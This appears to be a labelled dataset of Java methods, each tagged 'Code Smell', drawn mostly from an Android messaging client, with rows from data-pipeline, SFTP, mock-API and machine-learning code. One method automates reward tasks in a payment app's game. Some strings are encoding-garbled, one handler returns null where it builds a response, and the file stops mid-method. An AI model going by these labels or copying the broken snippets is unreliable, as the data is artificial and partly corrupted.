        textView.setText(LocaleController.getString(""GlobalAttachInlineRestricted"",R.string.GlobalAttachInlineRestricted));
      }
 else       if (AndroidUtilities.isBannedForever(chat.banned_rights)) {
        textView.setText(LocaleController.getString(""AttachInlineRestrictedForever"",R.string.AttachInlineRestrictedForever));
      }
 else {
        textView.setText(LocaleController.formatString(""AttachInlineRestricted"",R.string.AttachInlineRestricted,LocaleController.formatDateForBan(chat.banned_rights.until_date)));
      }
    }
  }
 else   if (type == 5) {
    QuickRepliesActivity.QuickReplyView cell=(QuickRepliesActivity.QuickReplyView)holder.itemView;
    if (quickReplies != null && position >= 0 && position < quickReplies.size()) {
      cell.set(quickReplies.get(position),quickRepliesQuery,USE_DIVIDERS && (position + 1) < getItemCount());
    }
  }
 else   if (searchResultBotContext != null) {
    boolean hasTop=searchResultBotContextSwitch != null || searchResultBotWebViewSwitch != null;
    if (holder.getItemViewType() == 2) {
      if (hasTop) {
        ((BotSwitchCell)holder.itemView).setText(searchResultBotContextSwitch != null ? searchResultBotContextSwitch.text : searchResultBotWebViewSwitch.text);
      }
    }
 else {
      if (hasTop) {
        position--;
      }
      ((ContextLinkCell)holder.itemView).setLink(searchResultBotContext.get(position),foundContextBot,contextMedia,position != searchResultBotContext.size() - 1,hasTop && position == 0,""gif"".equals(searchingContextUsername));
    }
  }
 else {
    MentionCell cell=(MentionCell)holder.itemView;
    if (searchResultUsernames != null) {
      TLObject object=searchResultUsernames.get(position);
      if (object instanceof TLRPC.User) {
        cell.setUser((TLRPC.User)object);
      }
 else       if (object instanceof TLRPC.Chat) {
        cell.setChat((TLRPC.Chat)object);
      }
    }
 else     if (searchResultHashtags != null) {
      cell.setText(searchResultHashtags.get(position));
    }
 else     if (searchResultSuggestions != null) {
      cell.setEmojiSuggestion(searchResultSuggestions.get(position));
    }
 else     if (searchResultCommands != null) {
      cell.setBotCommand(searchResultCommands.get(position),searchResultCommandsHelp.get(position),searchResultCommandsUsers != null ? searchResultCommandsUsers.get(position) : null);
    }
    cell.setDivider(USE_DIVIDERS && (isReversed ? position > 0 : position < getItemCount() - 1));
  }
}",1,Code Smell
"/** 
 * by orderIn0
 * @param list
 * @param q
 * @param parsed
 * @throws InvocationTargetException
 * @throws IllegalAccessException
 */
public static <T>void sort(List<T> list,Q q,Parsed parsed){
  if (list.isEmpty())   return;
  List<KV> fixedSortList=q.getFixedSortList();
  if (fixedSortList == null || fixedSortList.isEmpty())   return;
  KV kv0=fixedSortList.get(0);
  List<T> tempList=new ArrayList<>();
  tempList.addAll(list);
  list.clear();
  String property=kv0.k;
  try {
    for (    Object para : (List<Object>)kv0.v) {
      for (      T result : tempList) {
        BeanElement be=parsed.getElement(property);
        Object o=be.getGetMethod().invoke(result);
        if (String.valueOf(para).equals(String.valueOf(o))) {
          list.add(result);
        }
      }
    }
  }
 catch (  Exception e) {
    SqliExceptionUtil.throwRuntimeExceptionFirst(e);
    throw new ParsingException(SqliExceptionUtil.getMessage(e));
  }
  SqliLoggerProxy.debug(q.getClzz(),""SORT IN "" + kv0.v);
}
public static <T>void sort(List<Map<String,Object>> list,Q.X qx){
  if (list.isEmpty())   return;
  List<KV> fixedSortList=qx.getFixedSortList();
  if (fixedSortList == null || fixedSortList.isEmpty())   return;
  KV kv0=fixedSortList.get(0);
  List<Map<String,Object>> tempList=new ArrayList<>();
  tempList.addAll(list);
  list.clear();
  String key=kv0.k;
  boolean isSimpleKey=qx.isResultWithDottedKey() || !key.contains(""."");
  String firstKey=null;
  String secondKey=null;
  if (!isSimpleKey) {
    String[] arr=key.split(""\\."");
    firstKey=arr[0];
    secondKey=arr[1];
  }
  try {
    for (    Object para : (List<Object>)kv0.v) {
      for (      Map<String,Object> map : tempList) {
        if (isSimpleKey) {
          if (String.valueOf(para).equals(String.valueOf(map.get(key)))) {
            list.add(map);
          }
        }
 else {
          Object o=((Map)map.get(firstKey)).get(secondKey);
          if (String.valueOf(para).equals(String.valueOf(o))) {
            list.add(map);
          }
        }
      }
    }
  }
 catch (  Exception e) {
    SqliExceptionUtil.throwRuntimeExceptionFirst(e);
    throw new ParsingException(SqliExceptionUtil.getMessage(e));
  }
  SqliLoggerProxy.debug(qx.getRepositoryClzz(),""SORT IN "" + kv0.v);
}",1,Code Smell
"private static void doFarmDailyTask(){
  try {
    String s=AntFarmRpcCall.listFarmTask();
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""memo""))) {
      JSONArray jaFarmTaskList=jo.getJSONArray(""farmTaskList"");
      for (int i=0; i < jaFarmTaskList.length(); i++) {
        jo=jaFarmTaskList.getJSONObject(i);
        String title=null;
        if (jo.has(""title""))         title=jo.getString(""title"");
        if (""TODO"".equals(jo.getString(""taskStatus""))) {
          int awardCount=jo.optInt(""awardCount"");
          String bizKey=jo.getString(""bizKey"");
          if (""VIEW"".equals(jo.optString(""taskMode"")) || bizKeyList.contains(bizKey)) {
            jo=new JSONObject(AntFarmRpcCall.doFarmTask(bizKey));
            if (""SUCCESS"".equals(jo.getString(""memo""))) {
              Log.farm(""搴勫洯浠诲姟馃Ь["" + title + ""]#鑾峰緱楗叉枡""+ awardCount+ ""g"");
            }
 else {
              Log.recordLog(jo.getString(""memo""),jo.toString());
            }
          }
 else           if (""搴勫洯灏忚棰�"".equals(title)) {
            jo=new JSONObject(AntFarmRpcCall.queryTabVideoUrl());
            if (""SUCCESS"".equals(jo.getString(""memo""))) {
              String videoUrl=jo.getString(""videoUrl"");
              String contentId=videoUrl.substring(videoUrl.indexOf(""&contentId="") + 1,videoUrl.indexOf(""&refer""));
              jo=new JSONObject(AntFarmRpcCall.videoDeliverModule(contentId));
              if (jo.getBoolean(""success"")) {
                Thread.sleep(15100);
                jo=new JSONObject(AntFarmRpcCall.videoTrigger(contentId));
                if (jo.getBoolean(""success"")) {
                  Log.farm(""搴勫洯浠诲姟馃Ь["" + title + ""]#鑾峰緱楗叉枡""+ awardCount+ ""g"");
                }
 else {
                  Log.recordLog(jo.getString(""resultMsg""),jo.toString());
                }
              }
 else {
                Log.recordLog(jo.getString(""resultMsg""),jo.toString());
              }
            }
 else {
              Log.recordLog(jo.getString(""memo""),jo.toString());
            }
          }
        }
      }
    }
 else {
      Log.recordLog(jo.getString(""memo""),s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""doFarmDailyTask err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * 鏍￠獙瀛恦iew鍐呭婊氬姩浣嶇疆鏄惁姝ｇ‘
 */
private void checkTargetsScroll(boolean isLayoutChange,boolean isForce){
  if (!isForce && (mTouching || !mScroller.isFinished() || mScrollToIndex != -1)) {
    return;
  }
  int oldScrollY=computeVerticalScrollOffset();
  View target=findFirstVisibleView();
  if (target == null) {
    return;
  }
  int index=indexOfChild(target);
  if (isLayoutChange) {
    while (true) {
      int bottomOffset=ScrollUtils.getScrollBottomOffset(target);
      int scrollTopOffset=target.getTop() - getScrollY();
      if (bottomOffset > 0 && scrollTopOffset < 0) {
        int offset=Math.min(bottomOffset,-scrollTopOffset);
        scrollSelf(getScrollY() - offset);
        scrollChild(target,offset);
      }
 else {
        break;
      }
    }
  }
  for (int i=0; i < index; i++) {
    final View child=getChildAt(i);
    if (child.getVisibility() == GONE) {
      continue;
    }
    if (ScrollUtils.isConsecutiveScrollerChild(child)) {
      View scrollChild=ScrollUtils.getScrollChild(child);
      if (scrollChild instanceof IConsecutiveScroller) {
        List<View> views=((IConsecutiveScroller)scrollChild).getScrolledViews();
        if (views != null && !views.isEmpty()) {
          int size=views.size();
          for (int c=0; c < size; c++) {
            scrollChildContentToBottom(views.get(c));
          }
        }
      }
 else {
        scrollChildContentToBottom(scrollChild);
      }
    }
  }
  for (int i=index + 1; i < getChildCount(); i++) {
    final View child=getChildAt(i);
    if (child.getVisibility() == GONE) {
      continue;
    }
    if (ScrollUtils.isConsecutiveScrollerChild(child)) {
      if (i == getChildCount() - 1 && child.getHeight() < this.getHeight() && getScrollY() >= mScrollRange) {
        continue;
      }
      View scrollChild=ScrollUtils.getScrollChild(child);
      if (scrollChild instanceof IConsecutiveScroller) {
        List<View> views=((IConsecutiveScroller)scrollChild).getScrolledViews();
        if (views != null && !views.isEmpty()) {
          int size=views.size();
          for (int c=0; c < size; c++) {
            scrollChildContentToTop(views.get(c));
          }
        }
      }
 else {
        scrollChildContentToTop(scrollChild);
      }
    }
  }
  computeOwnScrollOffset();
  if (isLayoutChange) {
    int newScrollY=computeVerticalScrollOffset();
    if (oldScrollY != newScrollY) {
      scrollChange(newScrollY,oldScrollY);
    }
  }
  resetSticky();
}",1,Code Smell
"@Override protected void dispatchDraw(Canvas canvas){
  int minPosition=-1;
  View minView=null;
  for (int i=0; i < recyclerListView.getChildCount(); i++) {
    View child=recyclerListView.getChildAt(i);
    int childPosition=recyclerListView.getChildLayoutPosition(child);
    if (childPosition < minPosition || minPosition == -1) {
      minPosition=childPosition;
      minView=child;
    }
  }
  int paddingTop;
  if (minPosition == 0) {
    paddingTop=(int)Math.max(0,minView.getY());
  }
 else   if (minPosition > 0) {
    paddingTop=0;
  }
 else {
    paddingTop=recyclerListView.getPaddingTop();
  }
  if (topViewsContainer.getTranslationY() != paddingTop) {
    topViewsContainer.setTranslationY(paddingTop);
    onTopOffsetChanged(paddingTop);
  }
  shadowDrawable.setBounds(-AndroidUtilities.dp(6),paddingTop,getMeasuredWidth() + AndroidUtilities.dp(6),getMeasuredHeight());
  shadowDrawable.draw(canvas);
  if (checkAutoscroll) {
    checkAutoscroll=false;
    if (topViewsContainer.getTranslationY() != 0 && topViewsContainer.getTranslationY() != recyclerListView.getPaddingTop()) {
      if (topViewsContainer.getTranslationY() > recyclerListView.getPaddingTop() / 2f) {
        scroller.smoothScrollBy((int)-(recyclerListView.getPaddingTop() - topViewsContainer.getTranslationY()));
      }
 else {
        scroller.smoothScrollBy((int)topViewsContainer.getTranslationY());
      }
    }
  }
  super.dispatchDraw(canvas);
}
@Override protected void dispatchDraw(Canvas canvas){
  if (showContactsFilter) {
    float allViewersAlpha, contactsAlpha;
    if (selected == 0) {
      allViewersView.getHitRect(AndroidUtilities.rectTmp2);
      allViewersAlpha=1f;
      contactsAlpha=0.5f;
    }
 else {
      contactsViewersView.getHitRect(AndroidUtilities.rectTmp2);
      allViewersAlpha=0.5f;
      contactsAlpha=1f;
    }
    rectF.set(AndroidUtilities.rectTmp2);
    if (animationProgress != 1f) {
      allViewersAlpha=AndroidUtilities.lerp(animateFromAlpha1,allViewersAlpha,animationProgress);
      contactsAlpha=AndroidUtilities.lerp(animateFromAlpha2,contactsAlpha,animationProgress);
      AndroidUtilities.lerp(animateFromRect,rectF,animationProgress,rectF);
    }
    allViewersView.setAlpha(allViewersAlpha);
    contactsViewersView.setAlpha(contactsAlpha);
    float r=rectF.height() / 2f;
    canvas.drawRoundRect(rectF,r,r,selectedPaint);
  }
  super.dispatchDraw(canvas);
}",1,Code Smell
"private Object convertJavaObject(Object value,TypeInfo<?> typeInfo){
  if (Objects.isNull(value)) {
    return null;
  }
  if (typeInfo instanceof MapTypeInfo) {
    if (!(value instanceof Map)) {
      throw BitSailException.asBitSailException(CommonErrorCode.CONVERT_NOT_SUPPORT,String.format(""Type %s can't convert to map type."",value.getClass()));
    }
    MapTypeInfo<?,?> mapTypeInfo=(MapTypeInfo<?,?>)typeInfo;
    Map<?,?> origin=(Map<?,?>)value;
    Map<Object,Object> converted=Maps.newHashMap();
    for (    Object key : origin.keySet()) {
      converted.put(convertJavaObject(key,mapTypeInfo.getKeyTypeInfo()),convertJavaObject(origin.get(key),mapTypeInfo.getValueTypeInfo()));
    }
    return converted;
  }
 else   if (typeInfo instanceof ListTypeInfo) {
    if (!(value instanceof List)) {
      throw BitSailException.asBitSailException(CommonErrorCode.CONVERT_NOT_SUPPORT,String.format(""Type %s can't convert to list type."",value.getClass()));
    }
    ListTypeInfo<?> listTypeInfo=(ListTypeInfo<?>)typeInfo;
    List<?> origin=(List<?>)value;
    List<Object> converted=Lists.newArrayList();
    for (    Object key : origin) {
      converted.add(convertJavaObject(key,listTypeInfo.getElementTypeInfo()));
    }
    return converted;
  }
 else {
    return convertPrimitiveObject(value,typeInfo);
  }
}
",1,Code Smell
"@CheckResult public static Bulletin createForwardedBulletin(Context context,FrameLayout containerLayout,int dialogsCount,long did,int messagesCount,int backgroundColor,int textColor){
  final Bulletin.LottieLayout layout=new Bulletin.LottieLayout(context,null,backgroundColor,textColor);
  CharSequence text;
  int hapticDelay=-1;
  if (dialogsCount <= 1) {
    if (did == UserConfig.getInstance(UserConfig.selectedAccount).clientUserId) {
      if (messagesCount <= 1) {
        text=AndroidUtilities.replaceTags(LocaleController.getString(""FwdMessageToSavedMessages"",R.string.FwdMessageToSavedMessages));
      }
 else {
        text=AndroidUtilities.replaceTags(LocaleController.getString(""FwdMessagesToSavedMessages"",R.string.FwdMessagesToSavedMessages));
      }
      layout.setAnimation(R.raw.saved_messages,30,30);
    }
 else {
      if (DialogObject.isChatDialog(did)) {
        TLRPC.Chat chat=MessagesController.getInstance(UserConfig.selectedAccount).getChat(-did);
        if (messagesCount <= 1) {
          text=AndroidUtilities.replaceTags(LocaleController.formatString(""FwdMessageToGroup"",R.string.FwdMessageToGroup,chat.title));
        }
 else {
          text=AndroidUtilities.replaceTags(LocaleController.formatString(""FwdMessagesToGroup"",R.string.FwdMessagesToGroup,chat.title));
        }
      }
 else {
        TLRPC.User user=MessagesController.getInstance(UserConfig.selectedAccount).getUser(did);
        if (messagesCount <= 1) {
          text=AndroidUtilities.replaceTags(LocaleController.formatString(""FwdMessageToUser"",R.string.FwdMessageToUser,UserObject.getFirstName(user)));
        }
 else {
          text=AndroidUtilities.replaceTags(LocaleController.formatString(""FwdMessagesToUser"",R.string.FwdMessagesToUser,UserObject.getFirstName(user)));
        }
      }
      layout.setAnimation(R.raw.forward,30,30);
      hapticDelay=300;
    }
  }
 else {
    if (messagesCount <= 1) {
      text=AndroidUtilities.replaceTags(LocaleController.formatPluralString(""FwdMessageToManyChats"",dialogsCount));
    }
 else {
      text=AndroidUtilities.replaceTags(LocaleController.formatPluralString(""FwdMessagesToManyChats"",dialogsCount));
    }
    layout.setAnimation(R.raw.forward,30,30);
    hapticDelay=300;
  }
  layout.textView.setText(text);
  if (hapticDelay > 0) {
    layout.postDelayed(() -> {
      layout.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP,HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
    }
,hapticDelay);
  }
  return Bulletin.make(containerLayout,layout,Bulletin.DURATION_SHORT);
}",1,Code Smell
"@Override public void processElement(T value) throws Exception {
  try {
    if (disableSwitch()) {
      writer.write((RowData)value);
    }
 else {
      if (isIncrementalPhase((RowData)value)) {
        switchToUpsert();
      }
      writer.write(switchHelper.removeIncrementalField((RowData)value));
    }
  }
 catch (  Exception e) {
    if (multipleSink) {
      throw e;
    }
    LOGGER.error(String.format(""write error, raw data: %s"",value),e);
    if (!dirtyOptions.ignoreDirty()) {
      throw e;
    }
    if (dirtySink != null) {
      DirtyData.Builder<Object> builder=DirtyData.builder();
      if (!disableSwitch()) {
        value=(T)switchHelper.removeIncrementalField((RowData)value);
      }
      try {
        builder.setData(value).setLabels(dirtyOptions.getLabels()).setLogTag(dirtyOptions.getLogTag()).setIdentifier(dirtyOptions.getIdentifier()).setRowType(flinkRowType).setDirtyMessage(e.getMessage());
        dirtySink.invoke(builder.build());
        if (metricData != null) {
          metricData.invokeDirtyWithEstimate(value);
        }
      }
 catch (      Exception ex) {
        if (!dirtyOptions.ignoreSideOutputErrors()) {
          throw new RuntimeException(ex);
        }
        LOGGER.warn(""Dirty sink failed"",ex);
      }
    }
    return;
  }
  if (metricData != null) {
    metricData.invokeWithEstimate(value);
  }
}
",1,Code Smell
"public static int measureDevicePerformanceClass(){
  int androidVersion=Build.VERSION.SDK_INT;
  int cpuCount=ConnectionsManager.CPU_COUNT;
  int memoryClass=((ActivityManager)ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE)).getMemoryClass();
  if (NaConfig.INSTANCE.getFakeHighPerformanceDevice().Bool()) {
    return PERFORMANCE_CLASS_HIGH;
  }
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && Build.SOC_MODEL != null) {
    int hash=Build.SOC_MODEL.toUpperCase().hashCode();
    for (int i=0; i < LOW_SOC.length; ++i) {
      if (LOW_SOC[i] == hash) {
        return PERFORMANCE_CLASS_LOW;
      }
    }
  }
  int totalCpuFreq=0;
  int freqResolved=0;
  for (int i=0; i < cpuCount; i++) {
    try {
      RandomAccessFile reader=new RandomAccessFile(String.format(Locale.ENGLISH,""/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq"",i),""r"");
      String line=reader.readLine();
      if (line != null) {
        totalCpuFreq+=Utilities.parseInt(line) / 1000;
        freqResolved++;
      }
      reader.close();
    }
 catch (    Throwable ignore) {
    }
  }
  int maxCpuFreq=freqResolved == 0 ? -1 : (int)Math.ceil(totalCpuFreq / (float)freqResolved);
  long ram=-1;
  try {
    ActivityManager.MemoryInfo memoryInfo=new ActivityManager.MemoryInfo();
    ((ActivityManager)ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE)).getMemoryInfo(memoryInfo);
    ram=memoryInfo.totalMem;
  }
 catch (  Exception ignore) {
  }
  int performanceClass;
  if (androidVersion < 21 || cpuCount <= 2 || memoryClass <= 100 || cpuCount <= 4 && maxCpuFreq != -1 && maxCpuFreq <= 1250 || cpuCount <= 4 && maxCpuFreq <= 1600 && memoryClass <= 128 && androidVersion <= 21 || cpuCount <= 4 && maxCpuFreq <= 1300 && memoryClass <= 128 && androidVersion <= 24 || ram != -1 && ram < 2L * 1024L * 1024L* 1024L) {
    performanceClass=PERFORMANCE_CLASS_LOW;
  }
 else   if (cpuCount < 8 || memoryClass <= 160 || maxCpuFreq != -1 && maxCpuFreq <= 2055 || maxCpuFreq == -1 && cpuCount == 8 && androidVersion <= 23) {
    performanceClass=PERFORMANCE_CLASS_AVERAGE;
  }
 else {
    performanceClass=PERFORMANCE_CLASS_HIGH;
  }
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""device performance info selected_class = "" + performanceClass + "" (cpu_count = ""+ cpuCount+ "", freq = ""+ maxCpuFreq+ "", memoryClass = ""+ memoryClass+ "", android version ""+ androidVersion+ "", manufacture ""+ Build.MANUFACTURER+ "", screenRefreshRate=""+ AndroidUtilities.screenRefreshRate+ "")"");
  }
  return performanceClass;
}",1,Code Smell
"public MediaDataController(int num){
  super(num);
  if (currentAccount == 0) {
    draftPreferences=ApplicationLoader.applicationContext.getSharedPreferences(""drafts"",Activity.MODE_PRIVATE);
  }
 else {
    draftPreferences=ApplicationLoader.applicationContext.getSharedPreferences(""drafts"" + currentAccount,Activity.MODE_PRIVATE);
  }
  final ArrayList<TLRPC.Message> replyMessageOwners=new ArrayList<>();
  Map<String,?> values=draftPreferences.getAll();
  for (  Map.Entry<String,?> entry : values.entrySet()) {
    try {
      String key=entry.getKey();
      long did=Utilities.parseLong(key);
      byte[] bytes=Utilities.hexToBytes((String)entry.getValue());
      SerializedData serializedData=new SerializedData(bytes);
      boolean isThread=false;
      if (key.startsWith(""r_"") || (isThread=key.startsWith(""rt_""))) {
        TLRPC.Message message=TLRPC.Message.TLdeserialize(serializedData,serializedData.readInt32(true),true);
        if (message != null) {
          message.readAttachPath(serializedData,getUserConfig().clientUserId);
          LongSparseArray<TLRPC.Message> threads=draftMessages.get(did);
          if (threads == null) {
            threads=new LongSparseArray<>();
            draftMessages.put(did,threads);
          }
          int threadId=isThread ? Utilities.parseInt(key.substring(key.lastIndexOf('_') + 1)) : 0;
          threads.put(threadId,message);
          if (message.reply_to != null) {
            replyMessageOwners.add(message);
          }
        }
      }
 else {
        TLRPC.DraftMessage draftMessage=TLRPC.DraftMessage.TLdeserialize(serializedData,serializedData.readInt32(true),true);
        if (draftMessage != null) {
          LongSparseArray<TLRPC.DraftMessage> threads=drafts.get(did);
          if (threads == null) {
            threads=new LongSparseArray<>();
            drafts.put(did,threads);
          }
          long threadId=key.startsWith(""t_"") ? Utilities.parseInt(key.substring(key.lastIndexOf('_') + 1)) : 0;
          threads.put(threadId,draftMessage);
        }
      }
      serializedData.cleanup();
    }
 catch (    Exception e) {
    }
  }
  loadRepliesOfDraftReplies(replyMessageOwners);
  loadStickersByEmojiOrName(AndroidUtilities.STICKERS_PLACEHOLDER_PACK_NAME,false,true);
  loadEmojiThemes();
  loadRecentAndTopReactions(false);
  loadAvatarConstructor(false);
  loadAvatarConstructor(true);
  ringtoneDataStore=new RingtoneDataStore(currentAccount);
  menuBotsUpdateDate=getMessagesController().getMainSettings().getInt(""menuBotsUpdateDate"",0);
}",1,Code Smell
"@Override public List<String> getFiles(String path){
  if (StringUtils.isBlank(path)) {
    path=SP;
  }
  List<String> sources=new ArrayList<>();
  if (isDirExist(path)) {
    if (path.equals(DOT)) {
      return sources;
    }
    if (!path.endsWith(SP)) {
      path=path + SP;
    }
    try {
      Vector vector=channelSftp.ls(path);
      for (int i=0; i < vector.size(); ++i) {
        ChannelSftp.LsEntry le=(ChannelSftp.LsEntry)vector.get(i);
        String strName=le.getFilename();
        if (!strName.equals(DOT) && !strName.equals(DOT_DOT)) {
          String filePath=path + strName;
          sources.addAll(getFiles(filePath));
        }
      }
    }
 catch (    SftpException e) {
      LOG.error("""",e);
    }
  }
 else   if (isFileExist(path)) {
    sources.add(path);
    return sources;
  }
  return sources;
}",1,Code Smell
"@Override public void onReceive(Context context,Intent intent){
  ApplicationLoader.postInitApplication();
  Bundle remoteInput=RemoteInput.getResultsFromIntent(intent);
  if (remoteInput == null) {
    return;
  }
  CharSequence text=remoteInput.getCharSequence(NotificationsController.EXTRA_VOICE_REPLY);
  if (TextUtils.isEmpty(text)) {
    return;
  }
  long dialogId=intent.getLongExtra(""dialog_id"",0);
  int maxId=intent.getIntExtra(""max_id"",0);
  long topicId=intent.getLongExtra(""topic_id"",0);
  int currentAccount=intent.getIntExtra(""currentAccount"",0);
  if (dialogId == 0 || maxId == 0 || !UserConfig.isValidAccount(currentAccount)) {
    return;
  }
  AccountInstance accountInstance=AccountInstance.getInstance(currentAccount);
  if (DialogObject.isUserDialog(dialogId)) {
    TLRPC.User user=accountInstance.getMessagesController().getUser(dialogId);
    if (user == null) {
      Utilities.globalQueue.postRunnable(() -> {
        TLRPC.User user1=accountInstance.getMessagesStorage().getUserSync(dialogId);
        AndroidUtilities.runOnUIThread(() -> {
          accountInstance.getMessagesController().putUser(user1,true);
          sendMessage(accountInstance,text,dialogId,topicId,maxId);
        }
);
      }
);
      return;
    }
  }
 else   if (DialogObject.isChatDialog(dialogId)) {
    TLRPC.Chat chat=accountInstance.getMessagesController().getChat(-dialogId);
    if (chat == null) {
      Utilities.globalQueue.postRunnable(() -> {
        TLRPC.Chat chat1=accountInstance.getMessagesStorage().getChatSync(-dialogId);
        AndroidUtilities.runOnUIThread(() -> {
          accountInstance.getMessagesController().putChat(chat1,true);
          sendMessage(accountInstance,text,dialogId,topicId,maxId);
        }
);
      }
);
      return;
    }
  }
  sendMessage(accountInstance,text,dialogId,topicId,maxId);
}",1,Code Smell
"private ResponseEntity<?> getResponseBody(ApiDefinitionMockConfig config,String apiId,String projectId){
  ResponseBody responseBody=null;
  List<MsHeader> responseHeader=null;
  int responseCode=-1;
  String useApiResponseId=null;
  Long delay=null;
  if (config != null) {
    MockResponse mockResponse=JSON.parseObject(new String(config.getResponse()),MockResponse.class);
    if (mockResponse.isUseApiResponse()) {
      useApiResponseId=mockResponse.getApiResponseId();
    }
 else {
      responseCode=mockResponse.getStatusCode();
      responseHeader=mockResponse.getHeaders();
      responseBody=mockResponse.getBody();
      delay=mockResponse.getDelay();
    }
  }
  if (StringUtils.isNotBlank(useApiResponseId) || responseCode == -1) {
    HttpResponse mockSelectResponse=null;
    ApiDefinitionBlob blob=apiDefinitionBlobMapper.selectByPrimaryKey(apiId);
    if (blob != null) {
      List<HttpResponse> responseList=JSON.parseArray(new String(blob.getResponse()),HttpResponse.class);
      HttpResponse defaultHttpResponse=responseList.stream().filter(HttpResponse::isDefaultFlag).findFirst().orElse(null);
      final String useId=useApiResponseId;
      mockSelectResponse=responseList.stream().filter(responseItem -> StringUtils.equals(responseItem.getId(),useId)).findFirst().orElse(defaultHttpResponse);
    }
    if (mockSelectResponse != null) {
      responseCode=Integer.parseInt(mockSelectResponse.getStatusCode());
      responseHeader=mockSelectResponse.getHeaders();
      responseBody=mockSelectResponse.getBody();
    }
  }
  HttpHeaders headers=new HttpHeaders();
  if (CollectionUtils.isNotEmpty(responseHeader)) {
    responseHeader.stream().filter(MsHeader::getEnable).forEach(header -> headers.add(header.getKey(),header.getValue()));
  }
  if (responseBody != null) {
    if (delay != null && delay > 0) {
      try {
        Thread.sleep(delay);
      }
 catch (      Exception ignored) {
      }
    }
    boolean isMock=config != null;
    String resourceId=config != null ? config.getId() : apiId;
    return null;
  }
  return requestNotFound();
}",1,Code Smell
"public boolean update(int currentAccount,int dialogsType,long dialogId){
  final AccountInstance account=AccountInstance.getInstance(currentAccount);
  final MessagesController controller=MessagesController.getInstance(currentAccount);
  if (!(controller.folderTags && account.getUserConfig().isPremium())) {
    final boolean wasEmpty=tags.isEmpty();
    tags.clear();
    return !wasEmpty;
  }
  ArrayList<MessagesController.DialogFilter> allFilters=controller.dialogFilters;
  MessagesController.DialogFilter currentFilter=null;
  if (dialogsType == DialogsActivity.DIALOGS_TYPE_FOLDER1) {
    currentFilter=controller.selectedDialogFilter[0];
  }
 else   if (dialogsType == DialogsActivity.DIALOGS_TYPE_FOLDER2) {
    currentFilter=controller.selectedDialogFilter[1];
  }
  filters.clear();
  if (dialogsType == DialogsActivity.DIALOGS_TYPE_DEFAULT || dialogsType == DialogsActivity.DIALOGS_TYPE_FOLDER1 || dialogsType == DialogsActivity.DIALOGS_TYPE_FOLDER2) {
    for (int i=0; i < allFilters.size(); ++i) {
      MessagesController.DialogFilter filter=allFilters.get(i);
      if (filter == null || filter == currentFilter || filter.color < 0)       continue;
      if (filter.includesDialog(account,dialogId)) {
        filters.add(filter);
      }
    }
  }
  boolean changed=false;
  for (int i=0; i < tags.size(); ++i) {
    Tag tag=tags.get(i);
    MessagesController.DialogFilter filter=null;
    for (int j=0; j < filters.size(); ++j) {
      if (filters.get(j).id == tag.filterId) {
        filter=filters.get(j);
        break;
      }
    }
    if (filter == null) {
      changed=true;
      tags.remove(i);
      i--;
    }
 else     if (filter.color != tag.colorId || filter.name != null && tag.layout != null && filter.name.length() != tag.layout.getText().length()) {
      tags.set(i,Tag.fromFilter(currentAccount,filter));
      changed=true;
    }
  }
  for (int i=0; i < filters.size(); ++i) {
    MessagesController.DialogFilter filter=filters.get(i);
    Tag tag=null;
    for (int j=0; j < tags.size(); ++j) {
      if (tags.get(j).filterId == filter.id) {
        tag=tags.get(j);
        break;
      }
    }
    if (tag == null) {
      changed=true;
      tags.add(i,Tag.fromFilter(currentAccount,filter));
    }
  }
  filters.clear();
  return changed;
}",1,Code Smell
"public boolean isGlobalSearch(int i){
  if (!searchWas) {
    return false;
  }
  if (!searchResultHashtags.isEmpty()) {
    return false;
  }
  if (isRecentSearchDisplayed()) {
    int offset=(hasHints() ? 1 : 0);
    ArrayList<RecentSearchObject> recent=searchWas ? filtered2RecentSearchObjects : filteredRecentSearchObjects;
    if (i > offset && i - 1 - offset < recent.size()) {
      return false;
    }
 else {
      i-=getRecentItemsCount();
    }
  }
  ArrayList<TLObject> globalSearch=searchAdapterHelper.getGlobalSearch();
  ArrayList<TLObject> localServerSearch=searchAdapterHelper.getLocalServerSearch();
  int localCount=searchResult.size();
  int localServerCount=localServerSearch.size();
  int phoneCount=searchAdapterHelper.getPhoneSearch().size();
  if (phoneCount > 3 && phoneCollapsed) {
    phoneCount=3;
  }
  int globalCount=globalSearch.isEmpty() ? 0 : globalSearch.size() + 1;
  if (globalCount > 4 && globalSearchCollapsed) {
    globalCount=4;
  }
  int contactsCount=searchContacts.size();
  if (contactsCount > 0) {
    if (i >= 0 && i < contactsCount) {
      return false;
    }
    i-=contactsCount + 1;
  }
  if (localCount + localServerCount > 0 && (getRecentItemsCount() > 0 || !searchTopics.isEmpty())) {
    if (i == 0) {
      return false;
    }
    i--;
  }
  if (i >= 0 && i < localCount) {
    return false;
  }
  i-=localCount;
  if (i >= 0 && i < localServerCount) {
    return false;
  }
  i-=localServerCount;
  if (i > 0 && i < phoneCount) {
    return false;
  }
  i-=phoneCount;
  if (i > 0 && i < globalCount) {
    return true;
  }
  i-=globalCount;
  int localMessagesCount=searchForumResultMessages.isEmpty() ? 0 : searchForumResultMessages.size() + 1;
  if (i > 0 && i < localMessagesCount) {
    return false;
  }
  i-=localMessagesCount;
  int messagesCount=searchResultMessages.isEmpty() ? 0 : searchResultMessages.size() + 1;
  if (i > 0 && i < messagesCount) {
    return false;
  }
  return false;
}",1,Code Smell
"/** 
 * The l2 or euclidean distance between this vector and the other vector.
 * @param other The other vector.
 * @return The euclidean distance between them.
 */
@Override public double euclideanDistance(SGDVector other){
  if (other.size() != elements.length) {
    throw new IllegalArgumentException(""Can't measure distance of two vectors of different lengths, this = "" + elements.length + "", other = ""+ other.size());
  }
 else   if (other instanceof DenseVector) {
    double score=0.0;
    for (int i=0; i < elements.length; i++) {
      double tmp=get(i) - other.get(i);
      score+=tmp * tmp;
    }
    return Math.sqrt(score);
  }
 else   if (other instanceof SparseVector) {
    double score=0.0;
    int i=0;
    Iterator<VectorTuple> otherItr=other.iterator();
    VectorTuple otherTuple;
    while (i < elements.length && otherItr.hasNext()) {
      otherTuple=otherItr.next();
